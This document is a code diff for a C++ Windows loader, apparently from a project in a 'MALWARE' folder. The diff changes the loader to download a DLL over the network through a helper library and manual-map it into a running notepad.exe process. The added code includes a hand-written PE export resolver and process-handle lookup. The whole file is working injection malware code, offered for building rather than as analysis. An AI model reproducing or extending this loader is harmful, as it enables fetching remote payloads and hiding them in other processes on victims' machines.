@@ -1,42 +1,91 @@
-//cl /std:c++17 /EHsc .\main.cpp .\injection.cpp /link /OUT:main.exe
+//cl /EHsc .\main.cpp .\injection.cpp /link /OUT:main.exe
 #define DEBUG 1
+
 #include "injection.h"
 #include <iostream>
 #include <Windows.h>
+#include <vector>
 
+///////////////////////////////////////////////////////////////////////////////////////
 
-bool ManualMap(HANDLE hproc, const char* dllPath);
+typedef int (*SendDataFunc)(const std::string&, const std::string&);
+typedef std::string (*RecvDataFunc)(const std::string&);
+typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
+bool ManualMap(HANDLE hproc, std::vector <unsigned char> *downloaded_dll);
 
-const char* szDLLFile = "C:\\MALWARE\\dll_injection\\basic_dll\\cute_lib.dll";
+///////////////////////////////////////////////////////////////////////////////////////
+SendDataFunc send_data;
+RecvDataFunc receive_data;
+RecvDataRawFunc receive_data_raw;
+
 const char szProc[] = "notepad.exe";
+///////////////////////////////////////////////////////////////////////////////////////
 
-DWORD GetProcessID(const wchar_t* processName)
+void* FindExportAddress(HMODULE hModule, const char* funcName)
 {
-    DWORD pid = 0;
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot != INVALID_HANDLE_VALUE)
+    if(!hModule || !funcName) return nullptr;
+
+    BYTE* base = (BYTE*)hModule;
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
+    DWORD peOffset = dos->e_lfanew;
+    DWORD peSig = *(DWORD*)(base + peOffset);
+    
+    // printf("\n[DEBUG] DOS e_lfanew: 0x%X", peOffset);
+    // printf("\n[DEBUG] NT Signature: 0x%X", peSig);
+
+    base = (BYTE*)hModule;
+    dos = (IMAGE_DOS_HEADER*)base;
+    if(dos->e_magic != IMAGE_DOS_SIGNATURE){ fuk("Magic did not match"); return nullptr; }
+
+    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
+    if(nt->Signature != IMAGE_NT_SIGNATURE){ fuk("NT signature did not match"); return nullptr; }
+
+    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if(dir.VirtualAddress == 0){ fuk("Optional header issue"); return nullptr; }
+
+    // printf("\nExportDir VA: 0x%X, Size: 0x%X", dir.VirtualAddress, dir.Size);
+    warn("Trying to resolve ",YELLOW"", funcName);
+
+    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + dir.VirtualAddress);
+    DWORD* nameRVAs = (DWORD*)(base + exp->AddressOfNames);
+    WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
+    DWORD* functions = (DWORD*)(base + exp->AddressOfFunctions);
+
+    for (DWORD i = 0; i < exp->NumberOfNames; ++i)
     {
-        PROCESSENTRY32W pe;
-        pe.dwSize = sizeof(pe);
-        if (Process32FirstW(hSnapshot, &pe))
+        char* name = (char*)(base + nameRVAs[i]);
+        if(_stricmp(name, funcName) == 0)
         {
-            do
+            DWORD funcRVA = functions[ordinals[i]];
+            BYTE* addr = base + funcRVA;
+
+            // Forwarded export check
+            if(funcRVA >= dir.VirtualAddress && funcRVA < dir.VirtualAddress + dir.Size)
             {
-                if (_wcsicmp(pe.szExeFile, processName) == 0)
-                {
-                    pid = pe.th32ProcessID;
-                    break;
-                }
-            } while (Process32NextW(hSnapshot, &pe));
+                fuk("Forwarded export: ", funcName);
+                return nullptr;
+            }
+            norm(GREEN"\t[DONE]");
+            return (void*)addr;
         }
-        CloseHandle(hSnapshot);
     }
-    return pid;
+
+    fuk("Function not found: ", funcName);
+    return nullptr;
 }
 
-int main()
+void load_dll()
 {
-    ok("IN\n");
+    HMODULE N_dll = LoadLibraryA("network_lib.dll");
+    if (N_dll == nullptr) std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
+
+    receive_data_raw = (RecvDataRawFunc)FindExportAddress(N_dll, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
+    send_data = (SendDataFunc)FindExportAddress(N_dll, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");    
+    receive_data = (RecvDataFunc)FindExportAddress(N_dll, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
+}
+
+HANDLE GetProcessHANDLE(const wchar_t* processName)
+{
     PROCESSENTRY32 PE32{0};
     PE32.dwSize = sizeof(PE32);
 
@@ -45,7 +94,7 @@ int main()
     {
         fuk("Failed to create snapshot: ", GetLastError(),"\n");
         system("pause");
-        return 1;
+        return nullptr;
     }
 
     DWORD PID = 0;
@@ -62,11 +111,29 @@ int main()
     // }CloseHandle(hSnap);
 
     norm("Trying to get a handle to the process...\n");
-    PID = GetProcessID(L"notepad.exe");
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot != INVALID_HANDLE_VALUE)
+    {
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(pe);
+        if (Process32FirstW(hSnapshot, &pe))
+        {
+            do
+            {
+                if (_wcsicmp(pe.szExeFile, processName) == 0)
+                {
+                    PID = pe.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(hSnapshot, &pe));
+        }
+        CloseHandle(hSnapshot);
+    }
+
     if (PID == 0)
     {
         fuk("[Target process not found]\n");
-        return 1;
+        return nullptr;
     } norm("Process ID: ", CYAN"", PID, "\n");
 
 
@@ -75,18 +142,28 @@ int main()
     if (!hProc)
     {
         fuk("[!] Failed to open process: ", GetLastError(), "\n");
-        return 1;
+        return nullptr;
     } norm(GREEN"\t\t[DONE]\n");
 
-    if(!ManualMap(hProc, szDLLFile))
+    return hProc;
+}
+
+int main()
+{
+    HANDLE hProc = GetProcessHANDLE(L"notepad.exe");
+    if(!hProc) fuk("Somethig went wrong");
+    else norm("hProc -> " ,CYAN"", hProc, "\n");
+
+    load_dll();
+    std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
+
+    if(!ManualMap(hProc, &downloaded_dll))
     {
         CloseHandle(hProc);
         fuk("Failed to inject DLL");
-        system("pause");
         return 1;
     } CloseHandle(hProc);
 
     ok("DLL injected successfully\n");
     return 0;
-
 }
